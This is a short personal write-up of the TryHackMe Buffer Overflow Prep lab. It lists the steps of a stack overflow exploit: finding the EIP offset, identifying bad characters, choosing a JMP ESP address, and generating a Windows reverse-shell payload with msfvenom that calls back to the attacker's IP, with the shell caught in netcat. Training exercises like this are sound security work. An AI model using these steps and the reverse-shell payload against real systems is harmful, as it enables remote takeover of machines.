# Link
- https://tryhackme.com/room/bufferoverflowprep

# Buffer Overflow Notes

## Fuzzing
- Trying to get the maximum length of strings that the server can handle with. In my case, the value was 2000

## Controlling EIP
- Find which byte represents the EIP
- Send a long message (to crash the server), but 4 in 4 chars are different
- Creating the payload:
    - `/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l MAX+400`
- Locate in EIP memory cell which 4 long string is storing
- String Hex: 6F43396E

## Find the index 
- Now that I have the String Hex, I'm going to use `pattern_offset` to find the index:
```bash
┌──(kali㉿kali)-[~/Desktop/CTFs/tryhackme/BufferOverflowPrep]
└─$ /usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q 6F43396E 
[*] Exact match at offset 1978
```

## Checking EIP
- To check if the index is correct, I'm going to insert a lot of _AAAA_'s and in the position 1978 the sequence _BBBB_

## Find Bad Characters
- These caracters makes the program stopps, like a "\x00", "eof", and other things in computting
- To check these characters, I'm going to create a payload that have all the possible bytes, and if the ESP register points into some of these bytes, it is a Bad Character
- I'm goint to create a list of these bad characters
- Creating the array of characters with `bytearray(range(1,256))`
- ESP: 01A8FA30
- Using `mona`, it's possible to check which are the BadChars:
    - `!mona compare -f c:\mona\oscp\bytearray.bin -a 01A8FA30`
    - 00 07 08 2e 2f a0 a1
- Not all of them're Bad Chars. Bad chars corrupt the next char, so the bad chars are: 
    - 00 07 2e a0
- Removing them from the payload

## Without Bad Characters
- Reloading the payload without the bad chars to check if they disappear

## Finding a Jump Point
- Run mona command to find it:
    - `!mona jmp -r esp -cpb "\x00\x07\x2e\xa0"`
- Finding instructions that doesn't contain the bad characters and are _JMP_ instructions
- Jump Point: 625011AF
- Writing as bytes: \x62\x50\x11\xaf
- Writing backwards (little-endian system): \xaf\x11\x50\x62
- Making `retn = "\xaf\x11\x50\x62"`

## Creating the revshell payload
- `msfvenom -p windows/shell_reverse_tcp LHOST=10.10.24.206 LPORT=4444 -b '\x00\x07\x2e\xa0' EXITFUNC=thread -f python`

## Prepend NOPs
- Creating space for storing the payload
- Using NOP

## Rev Shell
- After running the payload, with `netcat` active, I got a shell =D
